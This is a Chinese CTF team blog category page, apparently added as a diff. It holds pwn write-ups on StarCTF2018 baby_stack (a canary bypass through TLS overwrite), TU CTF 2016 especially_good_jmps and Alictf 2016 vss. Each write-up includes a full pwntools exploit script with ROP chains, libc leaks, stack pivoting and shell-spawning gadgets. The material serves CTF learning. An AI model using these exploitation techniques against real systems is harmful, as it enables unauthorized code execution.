@@ -1,0 +1,1112 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 4.2.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>分类: Pwn - Merak</title>
+
+
+    <meta property="og:type" content="website">
+<meta property="og:title" content="Merak">
+<meta property="og:url" content="https://we.buptmerak.cn/categories/Pwn/index.html">
+<meta property="og:site_name" content="Merak">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://we.buptmerak.cn/images/og_image.png">
+<meta property="article:author" content="Merak">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://we.buptmerak.cn/images/og_image.png">
+
+
+
+
+
+<link rel="alternative" href="/atom.xml" title="Merak" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/favicon.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-1CGE4V1H26"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1CGE4V1H26');
+</script>
+
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.png" alt="Merak" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">Home</a>
+                
+                <a class="navbar-item"
+                href="/archives">Archives</a>
+                
+                <a class="navbar-item"
+                href="/categories">Categories</a>
+                
+                <a class="navbar-item"
+                href="/tags">Tags</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    <div class="card-content">
+        <nav class="breadcrumb" aria-label="breadcrumbs">
+        <ul>
+            <li><a href="/categories">分类</a></li>
+            
+            <li class="is-active"><a href="#" aria-current="page">Pwn</a></li>
+        </ul>
+        </nav>
+    </div>
+</div>
+
+    
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2020-02-19T16:00:00.000Z">2020-02-20</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/Pwn/">Pwn</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    6 分钟 读完 (大约 854 个字)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2020/02/20/StarCTF2018%20baby_stack/">绕过Canary的其他姿势 StarCTF2018 baby_stack</a>
+            
+        </h1>
+        <div class="content">
+            <p>作者：LordRiot</p>
+<h4 id="emmmm今天把手机摔坏导致很不爽，于是搞了好几个小时这个题，最后发现自己是个rz-orz"><a href="#emmmm今天把手机摔坏导致很不爽，于是搞了好几个小时这个题，最后发现自己是个rz-orz" class="headerlink" title="emmmm今天把手机摔坏导致很不爽，于是搞了好几个小时这个题，最后发现自己是个rz orz"></a>emmmm今天把手机摔坏导致很不爽，于是搞了好几个小时这个题，最后发现自己是个rz orz</h4><h3 id="StarCTF2018-baby-stack"><a href="#StarCTF2018-baby-stack" class="headerlink" title="StarCTF2018 baby_stack"></a>StarCTF2018 baby_stack</h3><p>今天等修手机的时候想起昨天看到ichunqiu新春战役的BFnote里利用覆写TLS结构体bypass了canary，于是就很好奇其具体原理，查了一波发现，那一题是利用libc2.23的特殊机制覆写了main线程的TLS，然后找到另一个覆写TLS结构体的题，即是本题，不过不同的是，本题直接利用pthread_create函数，加了个线程出来，然后由于该线程的栈在其TLS结构体之上，所以可以覆写成功。</p>
+<p>这一题是我知道原理之后纯动调做的orz，就先打个断点，康康canary的值，之后跟进，直接find canary，查到其在内存中的所有位置，发现有四处，其中一处是在main线程的TLS，两处是在新线程的栈，一处是在新线程的TLS结构，然后算出偏移，直接全部覆写成’\x00’，然后由于改了TLS（TLS结构体里本身有些随机的量，例如一些在libc上的地址什么的，第一次覆写肯定无法保持，只能全覆写成0了），所以需要栈迁移一下，就read payload到新栈，然后劫持栈到新栈即可，然后似乎是由于payload长度的关系，我一度想写’/bin/sh\x00’，然后call system来getshell，但是始终不行，动调了俩小时，毫无起色，甚至我都跟着system源码单步调试了，发现似乎是payload的某个地方的覆写导致的，然后换成了one_gadget，一梭搞定，orz，原地自闭，下面贴一下exp。（one_gadget 我直接用的本地的，是2.27的，打远程的话，第一次leak出版本再获取一样的）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; process(&#39;.&#x2F;baby_stack&#39;)</span><br><span class="line"></span><br><span class="line">puts_plt &#x3D; 0x4006F0</span><br><span class="line">read_got &#x3D; 0x601FD0</span><br><span class="line">puts_got &#x3D; 0x601FB0</span><br><span class="line">new_stack &#x3D; 0x602400</span><br><span class="line">init_pop &#x3D; 0x400B6A</span><br><span class="line">init_mov &#x3D; 0x400B50</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x400b73</span><br><span class="line">pop_rbp &#x3D; 0x4007d8</span><br><span class="line">leave &#x3D; 0x4008a6</span><br><span class="line"></span><br><span class="line">fake_canary &#x3D; &#39;\x00&#39; * 8</span><br><span class="line">first_offset &#x3D; 0xB0</span><br><span class="line">second_offset &#x3D; 0x820</span><br><span class="line"></span><br><span class="line">fake_TLS &#x3D; p64(0x603270)</span><br><span class="line">fake_TLS +&#x3D; p64(0)</span><br><span class="line">fake_TLS +&#x3D; p64(1)</span><br><span class="line">fake_TLS +&#x3D; p64(0)</span><br><span class="line">fake_TLS +&#x3D; fake_canary</span><br><span class="line"></span><br><span class="line">rop_chain &#x3D; p64(init_pop)</span><br><span class="line">rop_chain +&#x3D; p64(0)</span><br><span class="line">rop_chain +&#x3D; p64(1)</span><br><span class="line">rop_chain +&#x3D; p64(read_got)</span><br><span class="line">rop_chain +&#x3D; p64(0)</span><br><span class="line">rop_chain +&#x3D; p64(new_stack)</span><br><span class="line">rop_chain +&#x3D; p64(0x400)</span><br><span class="line">rop_chain +&#x3D; p64(init_mov)</span><br><span class="line">rop_chain +&#x3D; &#39;\x00&#39; * 0x38</span><br><span class="line">rop_chain +&#x3D; p64(pop_rbp)</span><br><span class="line">rop_chain +&#x3D; p64(new_stack - 8)</span><br><span class="line">rop_chain +&#x3D; p64(leave)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;\x00&#39; * 0x101b</span><br><span class="line">payload +&#x3D; rop_chain</span><br><span class="line">payload +&#x3D; &#39;\x00&#39; * (second_offset - 16 - len(rop_chain))</span><br><span class="line">payload +&#x3D; fake_TLS</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;How many bytes do you want to send?&#39;)</span><br><span class="line">p.send(str(len(payload)))</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">p.send(&#39;\x00&#39; * 3)</span><br><span class="line"></span><br><span class="line">rop_chain &#x3D; p64(init_pop)</span><br><span class="line">rop_chain +&#x3D; p64(0)</span><br><span class="line">rop_chain +&#x3D; p64(1)</span><br><span class="line">rop_chain +&#x3D; p64(read_got)</span><br><span class="line">rop_chain +&#x3D; p64(0)</span><br><span class="line">rop_chain +&#x3D; p64(new_stack + 0x400)</span><br><span class="line">rop_chain +&#x3D; p64(0x400)</span><br><span class="line">rop_chain +&#x3D; p64(init_mov)</span><br><span class="line">rop_chain +&#x3D; &#39;\x00&#39; * 0x38</span><br><span class="line">rop_chain +&#x3D; p64(pop_rbp)</span><br><span class="line">rop_chain +&#x3D; p64(new_stack + 0x400 - 8)</span><br><span class="line">rop_chain +&#x3D; p64(leave)</span><br><span class="line"></span><br><span class="line">payload &#x3D; p64(pop_rdi)</span><br><span class="line">payload +&#x3D; p64(puts_got)</span><br><span class="line">payload +&#x3D; p64(puts_plt)</span><br><span class="line">payload +&#x3D; rop_chain</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;It\&#39;s time to say goodbye.&#39;)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr &#x3D; u64(p.recv(6).ljust(8, &#39;\x00&#39;))</span><br><span class="line">obj &#x3D; LibcSearcher(&#39;puts&#39;, puts_addr)</span><br><span class="line">base_addr &#x3D; puts_addr - obj.dump(&#39;puts&#39;)</span><br><span class="line">one_gadget &#x3D; 0x4f322 + base_addr</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>本来还想水一期栈迁移和SROP的博客，但最近事情太多了，还要赶紧学堆，就先鸽了，以后有时间把return to VDSO和SROP一块写了: - )</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+
+
+    
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2020-02-19T16:00:00.000Z">2020-02-20</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/Pwn/">Pwn</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    8 分钟 读完 (大约 1242 个字)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2020/02/20/Easy_ROP%20points/">Easy_ROP points</a>
+            
+        </h1>
+        <div class="content">
+            <p>作者：LordRiot</p>
+<h4 id="2月份美赛的不爽经历搞得人很不想学数学建模，于是最近开始复习pwn，这篇文章大概总结一下这一周复习的ROP中一些小point"><a href="#2月份美赛的不爽经历搞得人很不想学数学建模，于是最近开始复习pwn，这篇文章大概总结一下这一周复习的ROP中一些小point" class="headerlink" title="2月份美赛的不爽经历搞得人很不想学数学建模，于是最近开始复习pwn，这篇文章大概总结一下这一周复习的ROP中一些小point: )"></a>2月份美赛的不爽经历搞得人很不想学数学建模，于是最近开始复习pwn，这篇文章大概总结一下这一周复习的ROP中一些小point: )</h4><br>
+这篇中出现的题均是ichunqiu中Linux Pwn基础ROP中的题目，题目中的exp可能有些libc环境问题，
+具体地址数值不能直接代入，但思路均可参考:-(其实是我本地莫名加载不了题给libc 2333)
+
+<h3 id="TU-CTF-2016-especially-good-jmps"><a href="#TU-CTF-2016-especially-good-jmps" class="headerlink" title="TU CTF 2016-especially good jmps"></a>TU CTF 2016-especially good jmps</h3><p>这个题一开始有些困扰我的点在于scanf读入数字之后没有清空缓冲区，<br>如果直接sendline(‘1’)这样，那么缓冲区的’\n’就会将下个gets截断，<br>于是想到在’1’后面加一个字母来截断scanf对整数的读取，相当于payload开头的第一个字符<br>之后的padding记得相应少一个字符即可，exp如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; process(&#39;especially_good_jmps&#39;)</span><br><span class="line">puts_got &#x3D; 0x0804A018</span><br><span class="line">puts_plt &#x3D; 0x080483E0</span><br><span class="line">main_addr &#x3D; 0x08048420</span><br><span class="line">sh_addr &#x3D; 0x08048293</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;\x00&quot; * 0x2C</span><br><span class="line">payload +&#x3D; p32(puts_plt)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;name?\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;number?\n&#39;)</span><br><span class="line">p.send(&#39;1l&#39;)            #cut off the scanf() reading</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;odd number!\n&#39;)</span><br><span class="line">puts_addr &#x3D; u32(p.recv(4))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">obj &#x3D; LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="line">base_addr &#x3D; puts_addr - obj.dump(&quot;puts&quot;)</span><br><span class="line">sys_addr &#x3D; base_addr + obj.dump(&quot;system&quot;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;a&quot; * 0x2b    #because of the &#39;l&#39; hence here is 0x2c - 1 &#x3D; 0x2b</span><br><span class="line">payload +&#x3D; p32(sys_addr)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;name?\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;number?\n&#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Alictf-2016-vss"><a href="#Alictf-2016-vss" class="headerlink" title="Alictf 2016-vss"></a>Alictf 2016-vss</h3><p>emmmmmm，算是我做过的第一个静态编译的题，一开始放到IDA里我直接懵了，800多个函数，我还以为是个逆向题，后来查了点相关资料，才知道是个静态编译题，即将libc中的函数直接放到程序里。然后就是函数认证的问题，因为反汇编是一堆sub_xxxxx，emmmmm一个一个看还是比较费劲的，需要从给IDA引入libc.sig文件，将<a href="https://github.com/push0ebp/sig-database">sig数据库</a>的sig文件导入IDA下的”/lscan/lscan/i386/sig”，然后在IDA中使用shift + F5即可应用，但是匹配度有多有少，这个题我最终用三个sig文件匹配到了400多个函数，我试了用github上一个lscan的工具，但是并不好用，匹配率4000+%就离谱，所以目前可能还是只能自己手动添加，不过有一些主要函数大致就够了，这题本身主要是利用抬栈执行ropchain即可，具体原理其实自己想下函数调用很好明白。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; process(&#39;vss&#39;)</span><br><span class="line"></span><br><span class="line">add_rsp &#x3D; 0x46f2f1</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;py&#39;</span><br><span class="line"></span><br><span class="line">payload &#x3D; payload.ljust(0x48, &#39;a&#39;)</span><br><span class="line">payload +&#x3D; p64(add_rsp)</span><br><span class="line">payload &#x3D; payload.ljust(0x78, &#39;a&#39;) #to get the rop addr</span><br><span class="line"></span><br><span class="line"># the ropchain from ROPgadget:</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401937) # pop rsi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4080) # @ .data</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046f208) # pop rax ; ret</span><br><span class="line">payload +&#x3D; &#39;&#x2F;bin&#x2F;&#x2F;sh&#39;</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401937) # pop rsi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4088) # @ .data + 8</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000041bd1f) # xor rax, rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401823) # pop rdi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4080) # @ .data</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401937) # pop rsi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4088) # @ .data + 8</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000043ae05) # pop rdx ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c4088) # @ .data + 8</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000041bd1f) # xor rax, rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004004b8) # syscall</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Password&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
